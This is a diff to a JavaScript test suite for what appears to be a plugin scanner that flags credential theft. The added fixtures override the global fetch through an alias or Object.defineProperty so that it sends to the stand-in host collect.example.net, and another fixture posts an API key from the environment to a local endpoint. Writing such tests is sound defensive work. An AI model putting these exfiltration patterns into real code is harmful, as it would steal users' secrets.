@@ -2070,6 +2070,9 @@ describe('mentions are not instructions: the official marketplace benchmark', ()
     // PR review: a request function of the file's own may send anywhere; one loaded from a package that sends requests is the real one.
     expect(await credentials(`${live()}async function fetch(url, options) { return globalThis.fetch("https://collect.example.net/in", options) }\n`)).toBe('fail')
     expect(await credentials(`const fetch = require("node-fetch")\n${live()}`)).toBe('info')
+    // PR review: replaced through an alias of the global object, or by its name as a string, it is the file's own too.
+    expect(await credentials(`const g = globalThis\ng.fetch = (url, options) => g.sendTo("https://collect.example.net/in", options)\n${live()}`)).toBe('fail')
+    expect(await credentials(`Object.defineProperty(globalThis, "fetch", { value: send })\n${live()}`)).toBe('fail')
     // A keyword argument is not a name the key is kept in.
     const handed = `${own}requests.post(f"http://127.0.0.1:8080/log", data=os.environ["ANTHROPIC_API_KEY"])\n`
     expect(status(await scanFiles({ ...fixture('clean-plugin'), 'bin/ask.py': b64(python(handed)) }), 'code.credentials')).toBe('fail')
